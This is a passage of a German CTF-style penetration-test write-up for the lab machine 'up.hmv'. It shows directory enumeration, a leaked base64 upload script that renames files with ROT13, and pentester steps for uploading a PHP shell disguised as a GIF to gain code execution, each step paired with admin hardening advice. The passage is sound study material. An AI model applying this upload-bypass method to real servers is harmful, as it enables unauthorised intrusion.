+            `-b '503,404,403'`: Auszublendende Statuscodes.
+            `-e`: Erweiterter Modus (für das Parsen von HTML nach Links, hier aber eher für die Erweiterungssuche relevant).
+            `--no-error`: Unterdrückt Fehler.
+            `-k`: Überspringt SSL-Verifizierung.
+            Gefundene Pfade:
+            <span class="command">http://192.168.2.172/index.php</span> (Status: 200)
+            <span class="command">http://192.168.2.172/uploads</span> (Status: 301, leitet weiter zu `/uploads/`)
+            <span class="command">http://192.168.2.172/javascript</span> (Status: 301, leitet weiter zu `/javascript/`)
+            <span class="command">http://192.168.2.172/sh.jpg</span> (Status: 200)</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster hat einige interessante Pfade gefunden. `/index.php` ist die Hauptseite. `/uploads/` ist besonders interessant, da die Webseite eine Upload-Funktion hat. `/javascript/` könnte clientseitigen Code enthalten. Die Datei `/sh.jpg` ist auffällig – eine `.jpg`-Datei mit dem Namen "sh" könnte eine getarnte Shell oder ein wichtiges Bild sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die gefundenen Pfade genauer:
+            `/uploads/`: Prüfen Sie, ob Verzeichnislisting aktiviert ist und welche Dateien dort liegen. Versuchen Sie, Dateien hochzuladen und zu sehen, ob sie in diesem Verzeichnis erscheinen.
+            `/javascript/`: Analysieren Sie den JavaScript-Code auf Hinweise zu API-Endpunkten oder clientseitiger Logik.
+            `/sh.jpg`: Laden Sie die Datei herunter und untersuchen Sie sie (z.B. mit `file`, `exiftool`, Hex-Editor), um festzustellen, ob es sich tatsächlich um ein Bild oder um etwas anderes handelt.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Verzeichnislistings für alle Verzeichnisse, die nicht öffentlich einsehbar sein sollen (insbesondere `/uploads/`). Stellen Sie sicher, dass keine sensiblen Dateien oder Skripte in öffentlich zugänglichen Verzeichnissen liegen. Überprüfen Sie die Berechtigungen für das `/javascript/`-Verzeichnis.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://$IP" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
+                    <pre> 
+<span class="command">http://192.168.2.172/index.php</span>            (Status: 200) [Size: 4489]
+<span class="command">http://192.168.2.172/uploads</span>              (Status: 301) [Size: 316] [--&gt; http://192.168.2.172/uploads/]
+<span class="command">http://192.168.2.172/javascript</span>           (Status: 301) [Size: 319] [--&gt; http://192.168.2.172/javascript/]
+<span class="command">http://192.168.2.172/sh.jpg</span>               (Status: 200) [Size: 1330919]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Nmap-Scan (`nmap -sV -A --script vuln 192.168.2.144 -T5`) zielt auf eine *andere IP-Adresse* (`192.168.2.144`) als das eigentliche Ziel (`192.168.2.172`). Die Ausgabe dieses Scans (`Ausgabe...`) wird nicht gezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan ist für den aktuellen Bericht über `up.hmv (192.168.2.172)` nicht direkt relevant, da er ein anderes Ziel untersucht. Es könnte sich um einen Fehler im Berichtstext handeln oder um einen parallelen Test, der hier versehentlich dokumentiert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass Scans und deren Ergebnisse korrekt dem jeweiligen Ziel zugeordnet werden, um Verwirrung im Bericht zu vermeiden.
+            <br><strong>Empfehlung (Admin):</strong> Dieser spezifische Scan liefert keine Informationen über das Ziel `up.hmv`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -A --script vuln 192.168.2.144 -T5</span></div>
+                    <pre>
+Ausgabe...</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode der Seite `http://192.168.2.172/index.php` wird angezeigt. Es handelt sich um ein HTML-Formular zum Hochladen von Bildern.
+            Wichtige Elemente:
+            `<form action="" method="post" enctype="multipart/form-data">`: Das Formular sendet Daten per POST an dieselbe Seite (`action=""`). `enctype="multipart/form-data"` ist für Dateiuploads notwendig.
+            `<input id="file-upload" type="file" name="image" accept=".jpg, .jpeg, .gif" required>`: Das Dateieingabefeld. Es akzeptiert clientseitig nur Dateien mit den Endungen `.jpg`, `.jpeg`, `.gif`. Das `name`-Attribut ist `image`.
+            Ein JavaScript-Teil am Ende dient dazu, den Namen der ausgewählten Datei im Upload-Bereich anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode bestätigt die Upload-Funktionalität. Die clientseitige Filterung auf `.jpg, .jpeg, .gif` (`accept`-Attribut) kann leicht umgangen werden (z.B. mit Burp Suite oder durch Ändern des HTML-Codes im Browser). Entscheidend ist die serverseitige Validierung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie die Upload-Funktion gründlich:
+            Versuchen Sie, Dateien mit anderen Endungen hochzuladen (z.B. `.php`, `.phtml`, `.sh`), indem Sie den Request mit Burp Suite modifizieren.
+            Prüfen Sie auf Schwachstellen wie doppelte Erweiterungen (z.B. `shell.php.jpg`).
+            Untersuchen Sie, wie der Server auf verschiedene Dateitypen und -größen reagiert.
+            Suchen Sie nach Directory-Traversal-Schwachstellen im Dateinamen oder Pfad.
+            <br><strong>Empfehlung (Admin):</strong> Verlassen Sie sich niemals auf clientseitige Validierung für die Sicherheit. Implementieren Sie eine robuste serverseitige Validierung von Dateitypen (anhand von Magic Bytes, nicht nur der Endung), Dateigrößen und Dateinamen. Speichern Sie hochgeladene Dateien sicher (außerhalb des Web-Roots, ohne Ausführungsrechte, mit zufälligen Namen).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>======================================================================================================
+view-source:http://192.168.2.172/index.php
+
+ 
+        &lt;h3&gt;Sube tu Imagen&lt;/h3&gt;
+        &lt;form action="" method="post" enctype="multipart/form-data"&gt; 
+       
+                Haz clic para subir un archivo
+     
+           &lt;input id="file-upload" type="file" name="image" accept=".jpg, .jpeg, .gif" required&gt;
+      &lt;button type="submit"&gt;Subir Imagen&lt;/button&gt;  
+ 
+      &lt;footer&gt;RodGar&lt;/footer&gt; 
+     &lt;script&gt; 
+        // Agregar clase al área de subida cuando se seleccione un archivo
+        const fileUpload = document.getElementById('file-upload');
+        const customFileUpload = document.querySelector('.custom-file-upload');
+
+        fileUpload.addEventListener('change', function() {
+            if (fileUpload.files.length &gt; 0) {
+                customFileUpload.classList.add('selected');
+                customFileUpload.innerText = fileUpload.files[0].name;
+            }
+        });
+  &lt;/script&gt;
+ ======================================================================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Beim Zugriff auf `http://192.168.2.172/uploads/` wird eine "Access Denied"-Seite angezeigt. Interessanterweise enthält die Seite den Text: "Remember listing absolutely everything can always be a good practice."</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnislisting für `/uploads/` ist deaktiviert, was gut ist. Die Nachricht "Remember listing absolutely everything can always be a good practice" ist ein klarer Hinweis (CTF-Style) darauf, dass es möglicherweise eine Datei gibt, die alle hochgeladenen Dateien oder andere wichtige Informationen auflistet. Oft ist dies `robots.txt` oder eine ähnliche Datei, die von Suchmaschinen oder Scannern übersehen werden soll, aber manuell gefunden werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach Dateien wie `robots.txt`, `sitemap.xml` oder anderen bekannten Dateien, die Pfade oder Informationen preisgeben könnten, im `/uploads/`-Verzeichnis oder im Hauptverzeichnis. Die Nachricht ist ein starker Hinweis darauf, dass hier etwas zu finden ist.
+            <br><strong>Empfehlung (Admin):</strong> Obwohl das Verzeichnislisting deaktiviert ist, sollten keine "Hinweis"-Nachrichten auf Fehlerseiten platziert werden, die Angreifern helfen könnten. Standard-Fehlerseiten sind vorzuziehen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>view-source:http://192.168.2.172/uploads/
+
+ &lt;h2&gt;Access Denied&lt;/h2&gt; 
+ 
+    &lt;h3&gt;<span class="password">Remember listing absolutely everything can always be a good practice.</span>&lt;/h3&gt;
+ 
+======================================================================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Zugriff auf `http://192.168.2.172/javascript/` resultiert in einem "403 Forbidden"-Fehler. Der Server verweigert den Zugriff auf diese Ressource.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bedeutet, dass entweder kein Index-Dokument (wie `index.html`) im Verzeichnis `/javascript/` vorhanden ist und Verzeichnislisting deaktiviert ist, oder der Zugriff auf dieses Verzeichnis generell blockiert wird. Da Gobuster es als Weiterleitung (301) zu `/javascript/` erkannt hat, existiert das Verzeichnis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn das Verzeichnislisting verboten ist, versuchen Sie, bekannte JavaScript-Dateinamen oder Bibliotheksnamen direkt unter diesem Pfad aufzurufen (z.B. `/javascript/main.js`, `/javascript/jquery.js`), falls es Hinweise auf deren Verwendung gibt.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für Verzeichnisse korrekt gesetzt sind. Wenn das Verzeichnis keine öffentlich zugänglichen Dateien enthalten soll, ist ein 403-Fehler angemessen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://192.168.2.172/javascript/
+
+<span class="password">Forbidden</span>
+
+You don't have permission to access this resource.
+Apache/2.4.62 (Debian) Server at 192.168.2.172 Port 80
+ 
+======================================================================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies scheint die Ansicht der `index.php` zu sein, nachdem eine Datei namens `shell.phppg` (wahrscheinlich ein Tippfehler für `shell.php.jpg` oder ein Versuch, Filter zu umgehen) hochgeladen wurde. Die Seite zeigt "Hochladen Sie Ihr Bild" und den Dateinamen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Upload-Versuch scheint stattgefunden zu haben. Es ist unklar, ob die Datei erfolgreich gespeichert wurde oder ob der Server sie aufgrund des Namens oder Typs abgelehnt hat. Die Nachricht "Die Datei ist richtig gestiegen" (El archivo se ha subido correctamente - Die Datei wurde korrekt hochgeladen) unter dem nächsten Screenshot deutet auf einen erfolgreichen Upload hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob die Datei `shell.phppg` (oder der korrekte Name, mit dem sie gespeichert wurde) im `/uploads/`-Verzeichnis vorhanden ist und ob sie ausgeführt werden kann.
+            <br><strong>Empfehlung (Admin):</strong> Die serverseitige Validierung muss robust genug sein, um solche Namensmanipulationen und Umgehungsversuche zu erkennen und zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://192.168.2.172/index.php
+
+Hochladen Sie Ihr Bild
+<span class="command">shell.phppg</span>
+======================================================================================================</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+       &lt;h3&gt;Sube tu Imagen&lt;/h3&gt;
+           Stöbern Sie in Ihrem Bild
+ 
+                Haz clic para subir un archivo
+                Klicken Sie hier, um eine Datei hochzuladen
+
+ 
+            &lt;input id="file-upload" type="file" name="image" accept=".jpg, .jpeg, .gif" required&gt; 
+             &lt;button type="submit"&gt;Subir Imagen&lt;/button&gt; 
+    
+                <span class="password">El archivo se ha subido correctamente.</span>   
+                Die Datei ist richtig gestiegen.
+ 
+======================================================================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Beim Versuch, `http://192.168.2.172/uploads/shell.php.jpg` aufzurufen, meldet der Server "404 Not Found".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bedeutet, dass die Datei unter diesem exakten Namen und Pfad nicht gefunden wurde. Entweder wurde sie nicht erfolgreich hochgeladen, unter einem anderen Namen gespeichert, oder der Pfad ist falsch. Der vorherige Screenshot zeigte jedoch die Erfolgsmeldung "El archivo se ha subido correctamente.".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es gibt eine Diskrepanz. Die Erfolgsmeldung und der 404-Fehler passen nicht zusammen. Überprüfen Sie den Upload-Mechanismus genauer. Möglicherweise wird der Dateiname serverseitig geändert. Die Nachricht auf der `/uploads/`-Seite ("Remember listing absolutely everything...") ist hier wieder relevant – es muss eine Datei geben, die Aufschluss über die hochgeladenen Dateien gibt.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Fehlermeldungen konsistent und nicht irreführend sind. Wenn eine Datei nicht gefunden wird, ist 404 korrekt. Der Upload-Prozess sollte transparent sein (für den Admin), aber Angreifern keine unnötigen Details verraten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://192.168.2.172/uploads/shell.php.jpg
+
+<span class="password">Not Found</span>
+
+The requested URL was not found on this server.
+Apache/2.4.62 (Debian) Server at 192.168.2.172 Port 80
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist eine Zusammenfassung von Ergebnissen eines Web-Crawlers oder Fuzzers (wahrscheinlich `feroxbuster`, basierend auf dem `ferox-http...state`-Dateinamen im unteren Teil).
+            Interessante Funde:
+            <span class="command">http://192.168.2.172/sh.jpg</span> (200 OK) - Bereits von Gobuster gefunden.
+            <span class="command">http://192.168.2.172/uploads/robots.txt</span> (200 OK) - Das ist der entscheidende Fund, basierend auf dem Hinweis!
+            <span class="command">http://192.168.2.172/javascript/clipboard/clipboard.js</span> (200 OK) - Eine spezifische JavaScript-Datei.
+            Der Rest sind bereits bekannte Pfade oder Standard-HTTP-Antworten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung von `/uploads/robots.txt` ist der Durchbruch, um zu verstehen, was mit den hochgeladenen Dateien passiert. Die `clipboard.js` könnte ebenfalls interessant sein, aber `robots.txt` hat jetzt Priorität.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie sofort den Inhalt von `http://192.168.2.172/uploads/robots.txt`. Diese Datei enthält oft Anweisungen für Webcrawler, kann aber in CTFs oder schlecht konfigurierten Systemen sensible Informationen oder Hinweise enthalten.
+            <br><strong>Empfehlung (Admin):</strong> Eine `robots.txt` im Upload-Verzeichnis ist höchst ungewöhnlich und deutet auf eine Fehlkonfiguration oder einen absichtlich platzierten Hinweis (im CTF-Kontext) hin. `robots.txt` gehört ins Wurzelverzeichnis der Webseite und sollte keine sensiblen Pfade von Upload-Verzeichnissen "verstecken" wollen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">200      GET     5455l    31425w  2390062c http://192.168.2.172/sh.jpg</span>
+<span class="command">200      GET      150l      388w     4489c http://192.168.2.172/index.php</span>
+<span class="command">200      GET      150l      388w     4489c http://192.168.2.172/</span>
+<span class="command">301      GET        9l       28w      316c http://192.168.2.172/uploads =&gt; http://192.168.2.172/uploads/</span>
+<span class="command">200      GET        1l        1w     1301c http://192.168.2.172/uploads/robots.txt</span>
+<span class="command">301      GET        9l       28w      319c http://192.168.2.172/javascript =&gt; http://192.168.2.172/javascript/</span>
+<span class="command">301      GET        9l       28w      329c http://192.168.2.172/javascript/clipboard =&gt; http://192.168.2.172/javascript/clipboard/</span>
+<span class="command">200      GET      858l     3081w    26377c http://192.168.2.172/javascript/clipboard/clipboard</span>
+<span class="command">200      GET      858l     3081w    26377c http://192.168.2.172/javascript/clipboard/clipboard.js</span>
+🚨 <span class="password">Caught ctrl+c</span> 🚨 saving scan state to ferox-http_192_168_2_172_uploads_-1739139489.state ...
+[#####&gt;--------------] - 7m   7003540/24701992 17m     found:9       errors:0      
+[######&gt;-------------] - 7m   1884344/6175372 4522/s  http://192.168.2.172/uploads/ 
+[######&gt;-------------] - 7m   1852620/6175372 4451/s  http://192.168.2.172/ 
+[#####&gt;--------------] - 7m   1824984/6175372 4451/s  http://192.168.2.172/javascript/ 
+[####&gt;---------------] - 6m   1438220/6175372 4281/s  http://192.168.2.172/javascript/clipboard/     
+
+======================================================================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `http://192.168.2.172/uploads/robots.txt` wird angezeigt. Es handelt sich um einen Base64-kodierten String: `PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo/Pgo=`</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Base64-kodierter Inhalt in einer `robots.txt` ist extrem verdächtig. Dies ist kein Standardinhalt für `robots.txt`. Es handelt sich sehr wahrscheinlich um den PHP-Quellcode des Upload-Skripts.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dekodieren Sie den Base64-String, um den PHP-Quellcode zu erhalten. Analysieren Sie diesen Code, um zu verstehen, wie der Dateiupload serverseitig gehandhabt wird, insbesondere wie Dateinamen verarbeitet und welche Validierungen durchgeführt werden.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Quellcode (auch nicht Base64-kodiert) in öffentlich zugänglichen Dateien wie `robots.txt`. Dies ist ein schwerwiegender Informationsleak. `robots.txt` dient dazu, das Verhalten von Webcrawlern zu steuern, nicht um Code zu verstecken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://192.168.2.172/uploads/robots.txt
+
+<span class="password">PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo/Pgo=</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Base64-String aus `robots.txt` wurde dekodiert (vermutlich mit einem Online-Tool wie `base64decode.org`). Das Ergebnis ist folgender PHP-Code:
+            ```php
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                $targetDir = "uploads/";
+                $fileName = basename($_FILES["image"]["name"]);
+                $fileType = pathinfo($fileName, PATHINFO_EXTENSION);
+                $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);
+
+                $allowedTypes = ['jpg', 'jpeg', 'gif'];
+                if (in_array(strtolower($fileType), $allowedTypes)) {
+                    $encryptedFileName = strtr($fileBaseName, 
+                        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 
+                        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');
+
+                    $newFileName = $encryptedFileName . "." . $fileType;
+                    $targetFilePath = $targetDir . $newFileName;
+
+                    if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
+                        $message = "El archivo se ha subido correctamente.";
+                    } else {
+                        $message = "Hubo un error al subir el archivo.";
+                    }
+                } else {
+                    $message = "Solo se permiten archivos JPG y GIF.";
+                }
+            }
+            ```
+            Das Skript prüft, ob die Anfrage eine POST-Anfrage ist.
+            Es extrahiert Dateiname, Typ und Basisname.
+            Es erlaubt nur die Dateitypen `jpg`, `jpeg`, `gif` (Groß-/Kleinschreibung wird ignoriert).
+            Der entscheidende Teil: Der Basisname der Datei (ohne Erweiterung) wird mit `strtr` "verschlüsselt". Dies ist eine ROT13-Chiffre, die nur auf Buchstaben angewendet wird (`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz` wird zu `NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm`).
+            Der neue Dateiname wird als `rot13(Basisname).Originaltyp` gespeichert.
+            Die Datei wird dann in das `uploads/`-Verzeichnis verschoben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies erklärt, warum die Datei `shell.php.jpg` nicht unter diesem Namen gefunden wurde! Der Basisname `shell.php` wird ROT13-verschlüsselt, bevor die ursprüngliche Erweiterung `.jpg` angehängt wird. Die Typ-Prüfung auf `jpg`, `jpeg`, `gif` ist vorhanden, aber da wir die Erweiterung kontrollieren können (z.B. `shell.php.jpg`), wird diese Prüfung erfolgreich sein. Die ROT13-"Verschlüsselung" des Namens ist die eigentliche Hürde, die es zu überwinden gilt, um den tatsächlichen Speicherpfad zu kennen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1.  Nehmen Sie den Basisnamen Ihrer PHP-Shell (z.B. `shell.php`).
+            2.  Wenden Sie ROT13 auf diesen Basisnamen an. `shell.php` würde zu `furyy.cuc` (da `.`, ` ` etc. nicht von ROT13 betroffen sind, wird `php` nicht geändert, aber da `.` in Dateinamen speziell ist, wird der Teil vor dem ersten Punkt als Basisname genommen: `shell` zu `furyy`). Wenn der Basisname `shell` ist, wird er zu `furyy`. Wenn der Basisname `shell.php` ist, wird er zu `furyy.cuc`. Hier muss man genau sein, wie `pathinfo($fileName, PATHINFO_FILENAME)` arbeitet, wenn der Dateiname z.B. `shell.php.gif` ist. `PATHINFO_FILENAME` gibt `shell.php` zurück. ROT13 auf `shell.php` ist `furyy.cuc`.
+            3.  Laden Sie eine Datei hoch, z.B. `shell.php.gif`.
+            4.  Der gespeicherte Name sollte dann `uploads/furyy.cuc.gif` sein.
+            5.  Versuchen Sie, diese Datei aufzurufen, um RCE zu erhalten. Da nur `.jpg`, `.jpeg`, `.gif` erlaubt sind, müssen wir eine dieser Erweiterungen verwenden. `.gif` ist eine gute Wahl, da GIF-Dateien oft weniger streng von Webservern behandelt werden als `.jpg` in Bezug auf ausführbaren Inhalt, aber das ist hier weniger relevant, da wir die Ausführung durch PHP anstreben.
+            <br><strong>Empfehlung (Admin):</strong> Diese Art der Namensverschleierung (ROT13) ist keine Sicherheitsmaßnahme. Sie bietet keinerlei Schutz. Die Dateitypvalidierung ist der wichtigere Teil, aber sie muss robust sein (Magic Bytes prüfen, nicht nur Erweiterungen). Das Speichern von ausführbarem Code, auch wenn er umbenannt wurde, im Web-Root ist gefährlich. Die beste Lösung ist, Uploads in einem Verzeichnis außerhalb des Web-Roots zu speichern oder sicherzustellen, dass im Upload-Verzeichnis keine Skriptausführung erlaubt ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>https://www.base64decode.org/
+ 
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $targetDir = "uploads/";
+    $fileName = basename($_FILES["image"]["name"]);
+    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);
+    $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);
+
+    $allowedTypes = ['jpg', 'jpeg', 'gif'];
+    if (in_array(strtolower($fileType), $allowedTypes)) {
+        $encryptedFileName = strtr($fileBaseName, 
+            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 
+            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');
+
+        $newFileName = $encryptedFileName . "." . $fileType;
+        $targetFilePath = $targetDir . $newFileName;
+
+        if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
+            $message = "El archivo se ha subido correctamente.";
+        } else {
+            $message = "Hubo un error al subir el archivo.";
+        }
+    } else {
+        $message = "Solo se permiten archivos JPG y GIF.";
+    }
+}</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> `ffuf` wird für eine weitere Directory/File-Enumeration verwendet.
+            `-u http://192.168.2.172/FUZZ`: Die URL, wobei `FUZZ` durch die Wortliste ersetzt wird.
